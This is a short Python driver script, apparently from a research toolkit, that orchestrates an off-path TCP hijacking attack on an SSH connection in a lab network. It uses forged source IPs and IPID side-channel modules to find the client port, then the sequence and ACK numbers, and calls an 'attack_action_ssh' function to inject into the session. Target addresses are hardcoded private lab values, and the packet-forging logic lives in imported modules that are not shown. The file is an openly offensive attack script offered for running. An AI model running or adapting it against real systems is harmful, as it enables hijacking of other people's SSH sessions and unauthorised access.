# coding=utf-8

import time

from IPID_HCSC.collision_find_s2 import Collision_Finder_2
from IPID_HCSC.connetcion_find import Connection_Finder
from IPID_HCSC.seq_find import Seq_Finder
from IPID_HCSC.ack_find import Ack_Finder, attack_action_ssh

if __name__ == '__main__':
    server_mac = '00:0c:29:20:f4:8c'
    server_ip = '10.10.100.2'
    server_port = 22

    client_ip = '10.10.100.1'

    attack_bind_if = 'ens33'
    own_ip_prefix = '10.10.0.0'
    collision_ip = '10.10.4.197'

    # collision = Collision_Finder_2(client_ip=client_ip, server_ip=server_ip, server_mac_addr=server_mac,
    #                                owned_prefix=own_ip_prefix, bind_iface=attack_bind_if)
    # collision.run()

    connection = Connection_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
                                   server_port=server_port, server_mac=server_mac, bind_if_name=attack_bind_if)
    connection.run()
    client_port = connection.result

    time.sleep(5)
    seq = Seq_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
                     server_port=server_port, client_port=client_port,
                     server_mac=server_mac, bind_ifname=attack_bind_if, verbose=False)
    seq.run()
    seq_in_win = seq.result

    if seq_in_win == -1:
        print('Seq Find Miss')
    else:
        ack = Ack_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
                         server_port=server_port, client_port=client_port, seq_in_win=seq_in_win,
                         server_mac=server_mac, bind_if_name=attack_bind_if)
        ack.run_attack_ssh()
        seq_exact = ack.seq_num

        attack_action_ssh(client_ip=client_ip, server_ip=server_ip, client_port=client_port,
                          server_port=server_port, seq=seq_exact, ifname=attack_bind_if)
